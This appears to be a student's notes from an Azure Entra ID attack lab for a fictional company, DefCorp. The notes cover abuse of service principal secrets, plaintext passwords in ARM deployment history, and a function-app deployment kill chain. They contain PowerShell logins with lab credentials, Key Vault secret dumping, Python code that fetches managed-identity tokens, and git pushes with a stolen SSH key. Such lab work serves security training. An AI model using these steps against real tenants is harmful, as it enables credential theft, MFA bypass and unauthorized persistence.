# Enterprise Applications

* Any application registered in Entra ID has two representations
  * Application (in PowerShell terminology) object that is present only in the tenant where app is registered. This is visible under App Registrations in the Azure portal.
  * Service Principal (in PowerShell terminology) that is present in every directory where application is used (in case of a multi-tenant application). This is visible under Enterprise Applications in the Azure portal. Azure RBAC roles use service principal.
* "An application has one application object in its home directory that is referenced by one or more service principals in each of the directories where it operates (including the application's home directory)"
* Service Principals (Enterprise Applications) are instances of the Application.

**Client Secrets**

* An application object supports multiple client secrets (application passwords).
* A user that is owner or have application administrator role over an application can add an application password.
* An application password can be used to login to a tenant as a service principal. MFA is usually not applied on a service principal!
* If we can compromise a user that has enough permissions to create a client secret/application password for an application object, we can
  * Login as the service principal for that application
  * Bypass MFA
  * Access all the resources where roles are assigned to the service principal
  * Add credentials to an enterprise applications for persistence after compromising a tenant

### Azure Resource Manager (ARM) Templates

* The 'infrastructure as code' service for Azure to deploy resources using code.
* ARM templates are JSON files containing deployment configuration forAzure resources.
* ARM templates also support a language called Bicep.
* Each resource group maintains a deployment history for up to 800 deployments. The history is automatically deleted when the count exceeds 775 deployments.
* Deployment history is a rich source of information!
* Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
* Useful information can be extracted from deployment history.
* It gives us the ability to have information about the resources that are not presently deployed but may be deployed again in future!
* A deployment parameter that contains sensitive information like passwords should have `SecureString` type. In case of a poorly written deployment template - that uses 'String' for such a parameter - we can get password in clear-text!

**Checking the managed Identity**

```powershell
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
Get-MgServicePrincipal -All | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl
```

**Using previously added application secret**

```powershell
$password = ConvertTo-SecureString '3Xv8Q~g-JzFY3PxHgo~mG-VWyw4nX6XqR-ACZadO' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983f-a7f3bd317d8f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6

Get-AzResource
Get-AzKeyVaultSecret -VaultName credvault-fileapp
Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText

# $username = "thomasebarlow@defcorpit.onmicrosoft.com";$password="DeployM3ntUserInTh3Tan3nt!!"
```

### Function App - Continuous Deployment

* Functions Apps (Azure Functions) support continuous deployment.
* In case continuous deployment is used, a source code update triggers a deployment to Azure.
* Following source code locations are supported
  * Azure Repos
  * GitHub
  * Bitbucket
* Deployment slots are supported so that deployments are first done in slots like staging (to avoid deploying directly in the default production slot)
* A misconfigured function app that deploys directly in production can be abused.
* In this case, if the source of truth/code location is compromised, it will be possible to assume the identity of the function app.
* For example, if GitHub is used as the provider, compromise of a GitHub account that can commit code will lead to compromise of the function app.

#### Kill Chain

1. Recall that we extract app.zip from one of the storage accounts. One of the files contained GitHub credentials for two users – `jenniferazad` and `laurenazad`. However, both the users have two factor authentication enabled.
2. Using authenticator.txt that contains backup of a GitHub's Time-based OTP (TOTP) app for `laurenazad`! Import it into Chrome's Google Authenticator extension.
3. Go to the SimpleApps repository - [https://github.com/DefCorp/SimpleApps](https://github.com/DefCorp/SimpleApps) The README of the repository tells us that – ' This repo is a part of the CI/CD pipeline used for testing various function app features.' and it contains URL of a function app - [https://simpleapps.azurewebsites.net/api/Student43](https://simpleapps.azurewebsites.net/api/Student43)
4. Check [**iniy.py**](http://iniy.py) in the directory for your student ID - [https://github.com/DefCorp/SimpleApps/blob/main/Student43/\_\_init\_\_.py](https://github.com/DefCorp/SimpleApps/blob/main/Student43/__init__.py)
5. Use your student ID in the URL in the README and browse to it using Chrome: [https://simpleapps.azurewebsites.net/api/student43](https://simpleapps.azurewebsites.net/api/student43)
6. Edit the [**init.py**](http://init.py) in your student**x** directory in the repo and paste the following code that gets an access token if there is a managed identity used by the function app. Recall that this is the code that we got from app.zip from the defcorpbackup storage account:

```powershell
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
	logging.info('Python HTTP trigger function processed a request.')
	IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
	IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
	cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
	val = os.popen(cmd).read()
	return func.HttpResponse(val, status_code=200)
```

1. Commit the changes! Now wait for a couple of minutes and deploy the changes to the function app by browsing to [https://simpleapps.azurewebsites.net/api/student43\*\*.\*\*](https://simpleapps.azurewebsites.net/api/student43**.**) You will get the access token of the managed identity:

```powershell
$accesstoken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29
Get-AzResourceGroup
Get-AzResourceGroupDeployment -ResourceGroupName SAP
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv

(cat C:\\AzAD\\Tools\\stevencking_defcorphq.onmicrosoft.com.sapsrv.json |ConvertFrom-Json |select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
Disconnect-AzAccount
```

```powershell
$password = ConvertTo-SecureString "St0rage@ccountsCanReadSt3v3n!!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('stevencking@defcorphq.onmicrosoft.com', $Password)
Connect-AzAccount -Credential $creds

Get-AzResource
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
```

```powershell
mkdir C:\\Users\\studentuser43\\.ssh
copy id_rsa C:\\Users\\studentuser43\\.ssh\\ 
cd C:\\AzAD\\Tools

ssh -T git@github.com
git clone git@github.com:DefCorp/CreateUsers.git

cd CreateUsers
mkdir student43
copy C:\\AzAD\\Tools\\CreateUsers\\Example\\user.json C:\\AzAD\\Tools\\CreateUsers\\student43\\user.json

git add .
git config --global user.email "81172144+jenniferazad@users.noreply.github.com"
git config --global user.name "jenniferazad"
git commit -m "Update"
git push
```

```powershell
{
 "accountEnabled": true,
 "displayName": "student2802",
 "mailNickname": "student2802",
 "userPrincipalName": "student2802@defcorphq.onmicrosoft.com",
 "passwordProfile" : {
   "forceChangePasswordNextSignIn": false,
   "password": "Stud2802Password@123"
 }
}

```

> Browse [https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=43](https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=43)

